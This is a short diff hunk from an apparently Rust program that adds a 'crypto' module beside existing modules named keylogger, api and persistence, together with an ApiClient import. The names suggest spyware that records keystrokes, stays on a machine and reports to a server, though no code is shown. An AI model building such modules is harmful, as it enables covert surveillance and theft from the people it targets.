@@ -2,6 +2,7 @@
 mod keylogger;
 mod api;
 mod persistence;
+mod crypto;
 
 use api::ApiClient;
 use std::sync::Arc;
